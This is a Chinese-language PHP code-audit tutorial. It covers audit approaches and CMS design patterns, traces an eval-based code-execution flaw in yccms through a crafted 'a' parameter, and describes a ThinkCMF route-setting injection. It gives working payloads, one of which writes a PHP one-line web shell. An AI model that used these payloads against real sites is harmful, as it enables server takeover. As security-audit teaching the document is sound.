# 准备工作

## 了解CMS的基本信息

1. 该CMS使用的是什么设计模式？
2. 该CMS每个目录大概负责的功能(视图、缓存、控制器等)。
3. 该CMS处理请求的基本流程是如何走的？
4. 以及在系统中使用的全局过滤函数是如何对数据进行处理的？

# 代码审计方法

## 敏感函数回溯

大多数的漏洞主要是php的函数的使用不当造成的，只要找到这些使用不当的函数，就可以快速的发现想要挖掘的漏洞。

## 定向功能分析

该方法主要是根据程序的业务逻辑和业务功能进行审计的。

## 通读全文

通过对整个项目的代码进行阅读从而发现问题，这种方法是最全面的但也是最麻烦的。

# PHP开发模式

## 常见的程序编写模式

1. 面向过程写法的程序，常见的普通类型
2. 常见的PHP框架，如Thinkphp、Laravel、Yii。
3. 基于原框架上经过二次开发的PHP框架，如Thinkcmf、ThinkBlog。
4. 企业自行开发的自用的框架。

总的来说一种是基于MVC(M:模型、V:视图、C:控制器)模型开发的程序，一种是普通面向过程的开发程序，针对不同的设计模式的系统我们应该采用不同的方法做审计。

## 普通程序设计模式

- 安全性较低，维护困难常常会出现安全性问题，开发者必须在每个文件开头加上include。
- 分析回溯较为简单，没有复杂的函数转发。
- URL模式：http://localhost/test.php
- 可维护性较低。
- 写法多基于原生代码。
- 可以利用Seay代码审计工具辅助做代码审计。

## MVC程序设计模式

- 安全性较高，大团队开发维护，单入口应用安全性好，只需要统一在入口处做好过滤即可。
- 分析回溯较为复杂，复杂的函数转发。
- URL模式：http://localhost/index.php?m=home&c=user&a=login，http://localhost/index.php/home/user/login
- 可维护性较高
- 写法多基于已封装好的函数，使用方便简单，减少代码冗余。
- 手工审计更为实际，工具只能起到辅助作用。

# yccms代码执行

用Fortify扫描后发现三个高危代码执行漏洞，针对最后一个漏洞，分析一下\public\class\Factory.class.php文件

```php
	static public function setModel() {
		$_a = self::getA();
		if (file_exists(ROOT_PATH.'/model/'.$_a.'Model.class.php')) eval('self::$_obj = new '.ucfirst($_a).'Model();');
		return self::$_obj;
	}
	static public function getA(){
		if(isset($_GET['a']) && !empty($_GET['a'])){
			return $_GET['a'];
		}
		return 'login';
	}
```

getA()方法接受a的参数，作为加载模型的文件名，如果该文件存在则执行eval函数实例化该模型。回溯查找setModel()方法，在\controller\Action.class.php中找到了，在加载Action类时会执行该类的构造函数，从而执行setModel()方法。

```php
class Action {
	protected $_tpl = null;
	protected $_model = null;	
	protected function __construct() {
		$this->_tpl = TPL::getInstance();
		$this->_model = Factory::setModel();
		Tool::setRequest(); //表单转义和html过滤	
	}
```

在\Controller\ArticleAction.class.php中可以发现ArticleAction类继承了Action类，并调用了父类的构造方法，可以通过访问此类的方法并构造合适的payload去触发漏洞

```php
<?php
//文章控制器
class ArticleAction extends Action{
	private $_total='';
	public function __construct(){
		parent::__construct();
		$this->_sys=new SystemModel();
		$this->_model=new ArticleModel();

	}
```

一个个控制器找，找到了直接实例化SearchAction方法的类，这里明显调用了我们正好需要的方法，这样一来就可以访问到最开始的EVAL函数了。

```php
<?php
//require str_replace('\\','/',substr(dirname(__FILE__),0,-7)).'/config/run.inc.php';
define('ROOT_PATH',str_replace('\\','/',substr(dirname(__FILE__),0,-7))); 
require ROOT_PATH.'/config/config.inc.php';
require ROOT_PATH.'/public/smarty/Smarty.class.php';
//自动加载类
function __autoload($_className){
	if(substr($_className,-6)=='Action'){
		require ROOT_PATH.'/controller/'.ucfirst($_className).'.class.php';
	}elseif(substr($_className, -5) == 'Model'){
		require ROOT_PATH.'/model/'.ucfirst($_className).'.class.php';
	}else{
		require ROOT_PATH.'/public/class/'.ucfirst($_className).'.class.php';
	}
}
$_tpl=TPL::getInstance();
$_search=new SearchAction();
$_search->index();
?>
```

回到最开始的地方，首先要经过file_exists函数，再经过ucfirst函数，ucfirst函数是将首字母转换成大写。file_exists函数只要目录存在文件不存在结果也为真的

```php
<?php
echo file_exists("f://test/../../");
?>
```

最终Payload构造为：`yccms/search/index.php?a=AdminModel();phpinfo();//../`，AdminModel();用来闭合前面的实例化，phpinfo();是我们要执行的代码，//用来注释后面的多余代码，../用来返回上一级目录。

# ThinkCMF框架

## 各目录功能

### api 

api目录

### app

应用目录

#### portal

门户应用目录

##### config.php

应用配置文件

##### common.php

模块函数文件

##### controller

控制器目录

##### model

模型目录

#### common.php

应用公共(函数)文件

#### config.php

应用(公共)配置文件

#### database.php

数据库配置文件

#### route.php

路由配置文件

### public

WEB 部署目录（对外访问目录）

####  api

api入口目录

#### plugins

插件目录

#### static 

静态资源存放目录(css,js,image)

#### themes 

前后台主题目录

#### upload

文件上传目录

#### index.php

入口文件

#### robots.txt

爬虫协议文件

#### router.php

快速测试文件

#### .htaccess apache

重写文件

### simplewind    

#### cmf

CMF核心库目录

#### extend

扩展类库目录

#### thinkphp

thinkphp目录

#### vendor

第三方类库目录（Composer）

## 代码执行漏洞     

当在后台【URL美化】功能中插入PHP代码保存后，重新访问该页面PHP代码会被执行，在public下创建11.php，导致产生代码执行漏洞。

![图片9](E:\file\知识\安全服务交付\图片9.png)

尝试抓包，看看我们在保存设置到最后执行PHP代码之间经历了什么

![图片10](E:\file\知识\安全服务交付\图片10.png)

一共提交了两个请求，第一个请求提交到admin目录下route控制器中的editpost方法

![图片11](E:\file\知识\安全服务交付\图片11.png)

该方法是用来接收参数后更新到数据库。流程应该就是当某个URL地址被访问后，路由机制会从数据出中读取是否存在该URL的地址转发，如果有，则访问到相对应的路径。

![图片12](E:\file\知识\安全服务交付\图片12.png)

第二个请求对route表中的数据排序后调用getRoutes方法

![图片12](E:\file\知识\安全服务交付\图片13.png)

跟进getRoutes方法

![图片15](E:\file\知识\安全服务交付\图片15.png)

最后构造payload:`'.file_put_contents('1.php','<?php @eval($_POST[1]); ?>').'`

![图片16](E:\file\知识\安全服务交付\图片14.png)
